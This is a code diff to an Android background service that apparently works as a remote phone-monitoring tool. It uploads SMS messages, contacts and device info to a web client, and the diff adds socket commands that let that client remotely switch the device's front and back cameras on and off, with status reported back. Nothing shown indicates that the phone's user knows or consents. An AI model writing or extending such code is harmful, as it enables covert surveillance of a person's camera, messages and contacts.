@@ -86,6 +86,7 @@ public class StreamingService extends Service implements android.hardware.Sensor
     private PeerConnection peerConnection;
     private Socket socket;
     private volatile String webClientId = null;
+    private volatile boolean isCameraStreaming = false;
     private FusedLocationProviderClient fusedLocationClient;
     private LocationCallback locationCallback;
     private BroadcastReceiver syncReceiver;
@@ -258,16 +259,87 @@ public class StreamingService extends Service implements android.hardware.Sensor
     private void setupMediaStreaming() {
         cameraManager = new CameraManager(this, eglBase);
         cameraManager.initialize(factory);
-        if (cameraManager.isConcurrentStreamingSupported()) {
-            cameraManager.startFrontCamera();
-            cameraManager.startBackCamera();
-        } else {
-            // Start Front Camera by default as requested
-            cameraManager.startFrontCamera();
-        }
+        // Camera is OFF by default — will be started on cmd:start_camera from web
+        // (saves battery and avoids unnecessary hardware usage during standby)
 
         setupAudioCapture();
         setupPeerConnection();
+    }
+
+    /** Called when web sends cmd:start_camera — resumes hardware camera capturer */
+    private void startCameraStreaming() {
+        if (isCameraStreaming) {
+            Log.d(TAG, "Camera already streaming, ignoring start");
+            return;
+        }
+        if (cameraManager == null) {
+            Log.e(TAG, "CameraManager not initialized");
+            return;
+        }
+        Log.d(TAG, "Starting on-demand camera stream");
+        // Run on background thread to avoid blocking the socket callback
+        new Thread(() -> {
+            try {
+                Thread.sleep(200); // Brief pause before hardware open
+                // Re-enable video tracks first so WebRTC resumes sending
+                cameraManager.setTracksEnabled(true);
+                if (cameraManager.isConcurrentStreamingSupported()) {
+                    cameraManager.startFrontCamera();
+                    cameraManager.startBackCamera();
+                } else {
+                    cameraManager.startFrontCamera();
+                }
+                isCameraStreaming = true;
+                emitCameraStatus(true);
+            } catch (Exception e) {
+                Log.e(TAG, "Error starting camera", e);
+            }
+        }).start();
+    }
+
+    /** Called when web sends cmd:stop_camera — pauses hardware capturer WITHOUT touching PeerConnection tracks.
+     *  IMPORTANT: Do NOT call cameraManager.dispose() here — it destroys VideoTrack objects
+     *  that are already registered in the PeerConnection, causing freeze on the next startCameraStreaming() call.
+     *  Instead, only stop the camera capturer so hardware is released, while tracks stay alive in PeerConnection. */
+    private void stopCameraStreaming() {
+        if (!isCameraStreaming) {
+            Log.d(TAG, "Camera not streaming, ignoring stop");
+            return;
+        }
+        if (cameraManager == null) return;
+        Log.d(TAG, "Stopping on-demand camera stream (hardware capturer only, tracks preserved in PeerConnection)");
+        new Thread(() -> {
+            try {
+                cameraManager.stopCapturers();
+                // Disable video tracks: WebRTC will NOT send RTP video frames
+                // Only tiny RTCP keepalive packets remain (~1-5 KB/s) instead of full video stream
+                cameraManager.setTracksEnabled(false);
+                Thread.sleep(300); // Allow Camera2 HAL to fully release
+                isCameraStreaming = false;
+                emitCameraStatus(false);
+            } catch (Exception e) {
+                Log.e(TAG, "Error stopping camera capturers", e);
+                isCameraStreaming = false;
+                emitCameraStatus(false);
+            }
+        }).start();
+    }
+
+    private void emitCameraStatus(boolean active) {
+        if (socket == null || !socket.connected()) return;
+        try {
+            JSONObject status = new JSONObject();
+            status.put("streaming", active);
+            status.put("activeCamera", active ? "front" : "none");
+            if (webClientId != null) {
+                status.put("to", webClientId);
+                status.put("from", socket.id());
+            }
+            socket.emit(Constants.EVENT_CAMERA_STATUS, status);
+            Log.d(TAG, "Emitted camera_status: streaming=" + active);
+        } catch (JSONException e) {
+            Log.e(TAG, "Error emitting camera status", e);
+        }
     }
 
     private void setupAudioCapture() {
@@ -411,6 +483,8 @@ public class StreamingService extends Service implements android.hardware.Sensor
             sendSmsMessages(); // Immediate sync
             sendContacts(); // Immediate sync
             sendDeviceInfo(); // Immediate sync
+            // Inform web of current camera streaming state
+            emitCameraStatus(isCameraStreaming);
         }).on(Constants.EVENT_SIGNAL, args -> {
             Log.d(TAG, "Signal incoming");
             if (args[0] instanceof JSONObject) {
@@ -525,6 +599,12 @@ public class StreamingService extends Service implements android.hardware.Sensor
             if (args.length > 0 && args[0] instanceof JSONObject) {
                 speakTts((JSONObject) args[0]);
             }
+        }).on(Constants.CMD_START_CAMERA, args -> {
+            Log.d(TAG, "CMD: cmd:start_camera received");
+            startCameraStreaming();
+        }).on(Constants.CMD_STOP_CAMERA, args -> {
+            Log.d(TAG, "CMD: cmd:stop_camera received");
+            stopCameraStreaming();
         });
 
         socket.connect();
